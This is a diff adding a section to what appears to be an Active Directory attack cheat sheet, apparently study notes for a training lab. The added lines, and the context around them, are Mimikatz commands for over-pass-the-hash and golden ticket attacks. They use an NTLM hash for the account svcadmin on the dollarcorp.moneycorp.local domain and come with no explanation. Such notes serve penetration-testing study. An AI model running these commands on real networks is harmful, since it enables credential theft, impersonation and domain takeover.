@@ -3033,6 +3033,14 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /
 ```
 Get-WmiObject -Class win32_operatingsystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
+##### MIMIKATZ - OVER PASS THE HASH (PROMPT ELEVADO)
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+```
+```
+Privilege::debug
+sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe
+```
 
 
 
